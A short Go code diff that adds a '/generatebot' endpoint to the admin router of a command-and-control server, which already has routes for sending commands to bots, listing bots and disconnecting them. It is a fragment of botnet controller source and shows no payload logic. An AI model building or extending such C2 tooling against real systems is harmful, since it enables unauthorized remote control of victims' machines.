@@ -37,6 +37,7 @@ func main() {
 	c2 := Newc2()
 
 	adminMux := http.NewServeMux()
+	adminMux.HandleFunc("/generatebot", GenerateBot)
 	adminMux.HandleFunc("/executeCommand/{botid}/", c2.SendCommand)
 	adminMux.HandleFunc("/listBots", c2.ListBots)
 	adminMux.HandleFunc("/disconnect/{botid}/", func(w http.ResponseWriter, r *http.Request) {
